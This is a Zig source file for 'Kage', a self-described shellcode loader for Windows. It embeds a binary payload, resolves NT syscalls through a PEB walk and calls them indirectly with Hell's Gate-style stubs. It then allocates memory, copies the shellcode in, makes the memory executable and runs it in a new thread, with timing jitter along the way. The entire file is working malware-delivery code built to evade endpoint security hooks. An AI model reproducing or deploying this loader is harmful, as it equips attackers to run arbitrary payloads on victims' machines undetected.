const std = @import("std");
const win = @import("win32.zig");
const syscall = @import("syscall.zig");

const print = std.debug.print;

var g_sys: syscall.Syscalls = undefined;

extern fn hells_gate(syscall_number: u32, address: usize) void;
extern fn hell_descent(arg1: usize, arg2: usize, arg3: usize, arg4: usize, arg5: usize, arg6: usize, arg7: usize, arg8: usize, arg9: usize, arg10: usize, arg11: usize) win.NTSTATUS;

fn ok(comptime fmt: []const u8, args: anytype) void { print("[+] " ++ fmt ++ "\n", args); }
fn info(comptime fmt: []const u8, args: anytype) void { print("[*] " ++ fmt ++ "\n", args); }
fn err(comptime fmt: []const u8, args: anytype) void { print("[-] " ++ fmt ++ "\n", args); }

const shellcode = @embedFile("../valak.bin");

fn banner() void {
    print(
        \\ Kage — shellcode loader
        \\ Author: JYenn
        \\
    , .{});
}

pub fn main() void {
    banner();

    if (shellcode.len == 0) {
        err("no shellcode embedded", .{});
        return;
    }

    g_sys = syscall.Syscalls.resolve() orelse {
        err("failed to resolve syscalls", .{});
        return;
    };
    ok("syscalls resolved via PEB walk", .{});

    const current_process: win.HANDLE = win.NtCurrentProcess;
    var base_addr: ?*anyopaque = null;
    var size: win.SIZE_T = shellcode.len;

    const status = ntAllocateVirtualMemory(current_process, &base_addr, 0, &size, win.MEM_COMMIT | win.MEM_RESERVE, win.PAGE_READWRITE);
    if (!win.NT_SUCCESS(status)) {
        err("NtAllocateVirtualMemory failed: 0x{X}", .{@as(u32, @bitCast(status))});
        return;
    }
    ok("allocated {d} bytes at 0x{X}", .{ size, @intFromPtr(base_addr) });
    jitter(10, 50);

    const buffer: [*]u8 = @ptrCast(base_addr);
    @memcpy(buffer[0..shellcode.len], &shellcode);
    info("shellcode loaded ({d} bytes)", .{shellcode.len});
    jitter(10, 30);

    var old_protect: win.ULONG = 0;
    _ = ntProtectVirtualMemory(current_process, &base_addr, &size, win.PAGE_EXECUTE_READ, &old_protect);
    ok("memory protected to RX", .{});
    jitter(5, 15);

    var thread_handle: win.HANDLE = undefined;
    _ = ntCreateThreadEx(&thread_handle, win.THREAD_ALL_ACCESS, null, current_process, @ptrFromInt(@intFromPtr(base_addr)), null, 0, 0, 0, 0, null);
    ok("thread created, waiting for completion", .{});

    _ = ntWaitForSingleObject(thread_handle, false, null);
}

fn ntAllocateVirtualMemory(process: win.HANDLE, base: *?*anyopaque, zero: win.ULONG_PTR, size: *win.SIZE_T, alloc: win.ULONG, prot: win.ULONG) win.NTSTATUS {
    const entry = g_sys.NtAllocateVirtualMemory;
    hells_gate(entry.number, @intFromPtr(entry.gadget));
    return hell_descent(
        @intFromPtr(process), @intFromPtr(base), zero, @intFromPtr(size), alloc, prot,
        0, 0, 0, 0, 0,
    );
}

fn ntProtectVirtualMemory(process: win.HANDLE, base: *?*anyopaque, size: *win.SIZE_T, new_prot: win.ULONG, old_prot: *win.ULONG) win.NTSTATUS {
    const entry = g_sys.NtProtectVirtualMemory;
    hells_gate(entry.number, @intFromPtr(entry.gadget));
    return hell_descent(
        @intFromPtr(process), @intFromPtr(base), @intFromPtr(size), new_prot, @intFromPtr(old_prot),
        0, 0, 0, 0, 0, 0,
    );
}

fn ntCreateThreadEx(handle: *win.HANDLE, access: win.ACCESS_MASK, attrs: ?*win.OBJECT_ATTRIBUTES, process: win.HANDLE, start: ?*anyopaque, arg: ?*anyopaque, flags: win.ULONG, zero: win.SIZE_T, stack: win.SIZE_T, max_stack: win.SIZE_T, list: ?*anyopaque) win.NTSTATUS {
    const entry = g_sys.NtCreateThreadEx;
    hells_gate(entry.number, @intFromPtr(entry.gadget));
    return hell_descent(
        @intFromPtr(handle), access, @intFromPtr(attrs), @intFromPtr(process), @intFromPtr(start),
        @intFromPtr(arg), flags, zero, stack, max_stack, @intFromPtr(list),
    );
}

fn ntWaitForSingleObject(handle: win.HANDLE, alertable: bool, timeout: ?*win.LARGE_INTEGER) win.NTSTATUS {
    const entry = g_sys.NtWaitForSingleObject;
    hells_gate(entry.number, @intFromPtr(entry.gadget));
    return hell_descent(
        @intFromPtr(handle), @intFromBool(alertable), @intFromPtr(timeout),
        0, 0, 0, 0, 0, 0, 0, 0,
    );
}

fn ntDelayExecution(alertable: bool, interval: *const win.LARGE_INTEGER) win.NTSTATUS {
    const entry = g_sys.NtDelayExecution;
    hells_gate(entry.number, @intFromPtr(entry.gadget));
    return hell_descent(@intFromBool(alertable), @intFromPtr(interval), 0, 0, 0, 0, 0, 0, 0, 0, 0);
}

fn jitter(min_ms: u64, max_ms: u64) void {
    var interval = win.LARGE_INTEGER{
        .QuadPart = -@as(i64, @intCast(min_ms * 10000 + (@as(u64, @intFromPtr(&min_ms)) % ((max_ms - min_ms + 1) * 10000)))),
    };
    _ = ntDelayExecution(false, &interval);
}
